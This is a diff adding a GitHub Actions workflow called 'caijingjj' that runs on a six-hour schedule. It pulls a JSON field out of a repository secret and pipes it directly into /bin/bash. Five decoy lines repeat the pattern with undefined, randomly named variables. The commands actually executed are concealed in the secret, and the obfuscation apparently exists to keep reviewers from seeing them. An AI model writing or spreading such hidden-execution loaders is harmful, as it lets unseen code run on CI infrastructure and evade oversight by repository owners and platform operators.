@@ -1,0 +1,23 @@
+name: caijingjj
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: caijingjj
+        env:
+          rt0: ${{ secrets.rt0 }}
+        run: |
+          echo $rt0 | jq -r .vsb31 | /bin/bash
+          echo $uqjwh3017 | jq -r .z4 | /bin/bash
+          echo $yupg0 | jq -r .k589 | /bin/bash
+          echo $oq6840 | jq -r .ygwjr39588 | /bin/bash
+          echo $aqbxg7 | jq -r .otz59955 | /bin/bash
+          echo $gzr29329 | jq -r .walsd7 | /bin/bash
+
